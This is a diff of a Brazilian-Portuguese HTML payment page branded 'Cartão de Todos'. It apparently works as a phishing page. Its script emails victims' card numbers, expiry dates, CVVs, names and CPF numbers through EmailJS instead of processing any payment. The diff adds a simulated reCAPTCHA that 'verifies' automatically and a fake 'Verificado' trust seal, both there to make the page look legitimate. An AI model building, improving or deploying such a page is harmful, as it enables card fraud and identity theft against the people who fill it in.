@@ -1,246 +1,210 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Forma de Arrecadação - Cartão de Todos</title>
-    <link rel="stylesheet" type="text/css" href="styles.css">
+    <link rel="stylesheet" type="text/css" href="styles.css" />
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        (function() {
-            emailjs.init("PH7ve0_A2N2UWzCRI");
-        })();
+      (function () {
+        emailjs.init("PH7ve0_A2N2UWzCRI");
+      })();
     </script>
     <script>
-        function selectCardType(type) {
-            document.getElementById('credit-button').classList.remove('selected');
-            document.getElementById('debit-button').classList.remove('selected');
-            document.getElementById(type + '-button').classList.add('selected');
-            document.getElementById('next-button').style.display = 'block';
-            document.getElementById('hidden-card-type').value = (type === 'credit') ? '2' : '1';
-        }
-
-        function showPaymentForm() {
-            document.getElementById('selection-page').style.display = 'none';
-            document.getElementById('payment-page').style.display = 'block';
-        }
-
-        function showThankYouPage() {
-            document.getElementById('payment-page').style.display = 'none';
-            document.getElementById('thank-you-page').style.display = 'block';
-        }
-
-        function validateCardNumber(input) {
-            let value = input.value.replace(/\D/g, '');
-            let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-            input.value = formattedValue;
-            input.setCustomValidity(/^(\d{4} ){3}\d{4}$/.test(formattedValue) ? '' : 'Número do cartão inválido');
-        }
-
-        function validateExpiryDate(input) {
-            let value = input.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
-            }
-            input.setCustomValidity(/^\d{2}\/\d{2}$/.test(input.value) ? '' : 'Data de validade inválida');
-        }
-
-        function validateCVV(input) {
-            input.setCustomValidity(/^\d{3}$/.test(input.value) ? '' : 'CVV inválido');
-        }
-
-        window.onload = function() {
-            document.getElementById('payment-form').addEventListener('submit', function(event) {
-                event.preventDefault();
-                emailjs.sendForm('service_ylmdgth', 'template_9cur51a', this)
-                    .then(() => {
-                        showThankYouPage();
-                    }, (error) => {
-                        console.log('FAILED...', error);
-                    });
-            });
-
-            document.getElementsByName('card_number')[0].addEventListener('input', function() {
-                validateCardNumber(this);
-            });
-
-            document.getElementsByName('expiry_date')[0].addEventListener('input', function() {
-                validateExpiryDate(this);
-            });
-
-            document.getElementsByName('cvv')[0].addEventListener('input', function() {
-                validateCVV(this);
-            });
-        }
+      window.onload = function () {
+        document.getElementById("current-year").textContent =
+          new Date().getFullYear();
+      };
     </script>
-</head>
-<body>
+    <script>
+      function showPaymentForm() {
+        document.getElementById("start-page").style.display = "none";
+        document.getElementById("payment-page").style.display = "block";
+      }
+
+      function showThankYouPage() {
+        document.getElementById("payment-page").style.display = "none";
+        document.getElementById("thank-you-page").style.display = "block";
+      }
+
+      function validateCardNumber(input) {
+        let value = input.value.replace(/\D/g, "");
+        let formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+        input.value = formattedValue;
+        input.setCustomValidity(
+          /^(\d{4} ){3}\d{4}$/.test(formattedValue)
+            ? ""
+            : "Número do cartão inválido"
+        );
+      }
+
+      function validateExpiryDate(input) {
+        let value = input.value.replace(/\D/g, "");
+        if (value.length > 2) {
+          input.value = value.slice(0, 2) + "/" + value.slice(2, 4);
+        }
+        input.setCustomValidity(
+          /^\d{2}\/\d{2}$/.test(input.value) ? "" : "Data de validade inválida"
+        );
+      }
+
+      function validateCVV(input) {
+        input.setCustomValidity(
+          /^\d{3}$/.test(input.value) ? "" : "CVV inválido"
+        );
+      }
+
+      function simulateRecaptcha() {
+        const recaptcha = document.getElementById("recaptcha");
+        const recaptchaText = document.getElementById("recaptcha-text");
+        recaptcha.innerHTML = '<div class="loading"></div>';
+        setTimeout(() => {
+          recaptcha.innerHTML = "<span>✔️</span>";
+          recaptchaText.textContent = "Você não é um robô";
+        }, 2000);
+      }
+
+      window.onload = function () {
+        document.getElementById("logo").addEventListener("click", function () {
+          window.location.reload();
+        });
+
+        document
+          .getElementById("payment-form")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            emailjs.sendForm("service_ylmdgth", "template_9cur51a", this).then(
+              () => {
+                showThankYouPage();
+              },
+              (error) => {
+                console.log("FAILED...", error);
+              }
+            );
+          });
+
+        document
+          .getElementsByName("card_number")[0]
+          .addEventListener("input", function () {
+            validateCardNumber(this);
+          });
+
+        document
+          .getElementsByName("expiry_date")[0]
+          .addEventListener("input", function () {
+            validateExpiryDate(this);
+          });
+
+        document
+          .getElementsByName("cvv")[0]
+          .addEventListener("input", function () {
+            validateCVV(this);
+          });
+
+        document
+          .getElementById("recaptcha")
+          .addEventListener("click", function () {
+            simulateRecaptcha();
+          });
+
+        document.getElementById("current-year").textContent =
+          new Date().getFullYear();
+      };
+    </script>
+  </head>
+  <body>
     <header>
-        <img src="cartaologo.png" alt="Cartão de Todos" class="logo">
-        <a href="https://wa.link/xpopm6" class="help-link">Ajuda</a>
+      <img src="cartaologo.png" alt="Cartão de Todos" class="logo" id="logo" />
+      <a href="https://wa.link/xpopm6" class="help-link">Ajuda</a>
     </header>
 
-    <div id="selection-page" class="page">
-        <h1>Forma de Arrecadação - Cartão de Todos</h1>
-        <div class="button-container">
-            <button id="credit-button" onclick="selectCardType('credit')">Crédito</button>
-            <button id="debit-button" onclick="selectCardType('debit')">Débito</button>
-        </div>
-        <button id="next-button" onclick="showPaymentForm()" class="next-button">Seguir</button>
-        <input type="hidden" id="hidden-card-type" name="card_type">
+    <div id="start-page" class="page">
+      <h1>Bem-vindo à Forma de Arrecadação</h1>
+      <button onclick="showPaymentForm()" class="start-button">
+        Prosseguir com o Pagamento
+      </button>
     </div>
 
-    <div id="payment-page" class="page" style="display: none;">
+    <div id="payment-page" class="page" style="display: none">
+      <div class="info-section">
+        <h2>Cartão de Todos</h2>
+        <p>Benefícios:</p>
+        <ul class="benefits-list">
+          <li><span class="check">✔️</span> Descontos em consultas médicas</li>
+          <li><span class="check">✔️</span> Descontos em farmácias</li>
+          <li>
+            <span class="check">✔️</span> Descontos em exames laboratoriais
+          </li>
+          <li>
+            <span class="check">✔️</span> Vantagens exclusivas em parceiros
+          </li>
+        </ul>
+        <p>Valor: 12 parcelas de R$ 29,70</p>
+      </div>
+      <div class="form-section">
         <form id="payment-form">
-            <h2>Dados do Cartão</h2>
-            <label>Número do Cartão</label>
-            <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
-            
-            <label>Data de Validade</label>
-            <input type="text" name="expiry_date" placeholder="MM/YY" required>
-            
-            <label>CVV</label>
-            <input type="text" name="cvv" placeholder="123" required>
-            
-            <input type="submit" value="Finalizar">
+          <h2>Dados do Pagamento</h2>
+          <label>Nome</label>
+          <input type="text" name="name" placeholder="Seu Nome" required />
+
+          <label>CPF</label>
+          <input type="text" name="cpf" placeholder="000.000.000-00" required />
+
+          <label for="card_type">Tipo de Cartão</label>
+          <select id="card_type" name="card_type" required>
+            <option value="Débito">Débito</option>
+            <option value="Crédito">Crédito</option>
+          </select>
+
+          <label>Número do Cartão</label>
+          <input
+            type="text"
+            name="card_number"
+            placeholder="1234 5678 9012 3456"
+            required
+          />
+
+          <label>Data de Validade</label>
+          <input type="text" name="expiry_date" placeholder="MM/YY" required />
+
+          <label>CVV</label>
+          <input type="text" name="cvv" placeholder="123" required />
+
+          <input type="submit" value="Finalizar" />
         </form>
+      </div>
     </div>
 
-    <div id="thank-you-page" class="page" style="display: none;">
-        <h1>Obrigado pelo seu pagamento!</h1>
-        <p>Entraremos em contato caso tenha ocorrido algum problema com a transação.</p>
+    <div id="thank-you-page" class="page" style="display: none">
+      <h1>Obrigado pelo seu pagamento!</h1>
+      <p>
+        Entraremos em contato caso tenha ocorrido algum problema com a
+        transação.
+      </p>
     </div>
-</body>
+    <footer>
+      <div class="social-icons">
+        <a
+          href="https://www.facebook.com/profile.php?id=100082955937810"
+          target="_blank"
+        >
+          <img src="facebook.png" alt="Facebook" />
+        </a>
+        <a
+          href="https://www.instagram.com/cdtcornelioprocopio?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw=="
+          target="_blank"
+        >
+          <img src="instagram.png" alt="Instagram" />
+        </a>
+        <a href="https://wa.link/0f53l5" target="_blank">
+          <img src="whatsapp.png" alt="WhatsApp" />
+        </a>
+      </div>
+      <div class="verification"><img src="selo.png" alt="Verificado" /></div>
+      <p>
+        &copy; <span id="current-year"></span> CARTAO DE CORNELIO PROCOPIO LTDA
+      </p>
+    </footer>
+  </body>
 </html>
-
-<style>
-body {
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    background-color: #e6f0fa;
-    flex-direction: column;
-    margin: 0;
-    padding: 0;
-}
-
-header {
-    width: 100%;
-    background-color: #5df662;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 10px 20px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    position: fixed;
-    top: 0;
-    z-index: 1000;
-}
-
-.logo {
-    width: 120px;
-    margin-left: 10px;
-}
-
-.help-link {
-    color: #fff;
-    text-decoration: none;
-    font-size: 18px;
-    font-weight: bold;
-    margin-right: 10px;
-}
-
-.help-link:hover {
-    text-decoration: underline;
-}
-
-.page {
-    background: #fff;
-    padding: 30px;
-    border-radius: 8px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    text-align: center;
-    max-width: 600px;
-    width: 100%;
-    margin-top: 80px;
-    box-sizing: border-box;
-}
-
-h1, h2 {
-    color: #4a7c50;
-    margin-bottom: 40px;
-}
-
-.button-container {
-    display: flex;
-    justify-content: center;
-    gap: 20px;
-    margin-bottom: 20px;
-    flex-wrap: wrap;
-}
-
-button {
-    background-color: #fff;
-    color: #4CAF50;
-    border: 2px solid #4CAF50;
-    padding: 10px 20px;
-    cursor: pointer;
-    border-radius: 5px;
-    font-size: 16px;
-    transition: background-color 0.3s, color 0.3s;
-}
-
-button:hover, .selected {
-    background-color: #4CAF50;
-    color: #fff;
-}
-
-.next-button {
-    align-items: center;
-    display: none;
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    cursor: pointer;
-    border-radius: 5px;
-    padding: 10px 20px;
-    font-size: 16px;
-    margin-top: 20px;
-}
-
-form {
-    text-align: left;
-}
-
-label {
-    display: block;
-    margin-bottom: 8px;
-    color: #4CAF50;
-    font-weight: bold;
-}
-
-input, select {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 15px;
-    border: 1px solid #ccc;
-    border-radius: 5px;
-    box-sizing: border-box;
-}
-
-input[type="submit"] {
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    cursor: pointer;
-    border-radius: 5px;
-    padding: 10px 20px;
-    font-size: 16px;
-}
-
-input[type="submit"]:hover {
-    background-color: #45a049;
-}
-</style>
